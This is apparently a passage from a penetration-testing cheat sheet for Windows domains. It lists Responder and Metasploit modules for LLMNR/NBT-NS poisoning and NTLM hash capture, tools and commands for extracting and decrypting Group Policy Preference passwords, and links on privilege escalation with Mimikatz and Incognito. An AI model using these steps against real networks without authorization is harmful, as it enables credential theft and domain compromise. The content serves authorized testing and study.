- [Sneaky Tricks](https://adsecurity.org/?p=1929)

### LLMNR/NetBios-NS spoofing

#### Responder

- If SMB signing is disabled

    - https://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html

#### Metasploit

- Spoof

    - auxiliary/spoof/llmnr/llmnr\_response

    - auxiliary/spoof/nbns/nbns\_response

- Capture

    - auxiliary/server/capture/smb

    - auxiliary/server/capture/http\_ntlm

    - set JOHNPWFILE /tmp/smbhashes.john

- Reference

    - https://www.gracefulsecurity.com/stealing-accounts-llmnr-and-nbt-ns-poisoning/

    - https://www.pentestpartners.com/blog/how-to-get-windows-to-give-you-credentials-through-llmnr/

### GPO

#### CPasswords

- GP3Finder - https://bitbucket.org/grimhacker/gpppfinder
```
gp3finder -A -t DOMAIN\_CONTROLLER -u DOMAINUSER\
```
- Locate SYSVOL

    - \\\\domain\_controller\\SYSVOL\\DOMAIN\_NAME\\Policies

    - Metasploit GPP Module

    - Decrypt GPP Password

        - PowerSploit - Get-GPPPassword

#### Detailed Group Policy Information
```
gpresult \[/x\], \[/h\] &lt;FILENAME&gt;
```
- Reference: https://technet.microsoft.com/en-us/library/cc733160(v=ws.11).aspx

### Privilege Escalation

#### Windows

- Helpful - https://www.gracefulsecurity.com/privilege-escalation-in-windows-domains/

- Powershell & C\# - https://decoder.cloud/2018/02/02/getting-system/

- Mimikatz - https://www.gracefulsecurity.com/privesc-dumping-passwords-in-plaintext-mimikatz/

- Incognito - https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/
